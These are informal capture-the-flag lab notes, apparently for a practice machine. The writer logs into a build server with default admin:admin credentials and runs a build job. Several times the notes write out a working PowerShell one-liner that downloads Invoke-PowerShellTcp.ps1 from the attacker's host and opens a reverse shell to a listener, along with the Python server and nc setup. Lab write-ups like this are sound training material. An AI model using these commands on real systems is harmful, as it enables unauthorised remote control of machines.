Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

we go to port 80 on browser and just a simple page with picture of bruce wayne an email link  and old html code, 

the -Pn is taking forever,,,,,

i jump to 8080 and login as admin:admin

create a new item and name it shell

we are told to use invoke power shell

powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.45:80/invokePowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.45 -Port 4433

save build

start python server on 80

start nc on 4433

hit build now

nothing,,,, second line of command i think its wrong so we modify,,,

powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.45:80/invokePowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.45 -Port 4433

third time,, took space out ,, to make it one line,,,

powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.45:80/invokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.45 -Port 4433


yeay  ---- the second call is the name of the function not file, first is the name of file
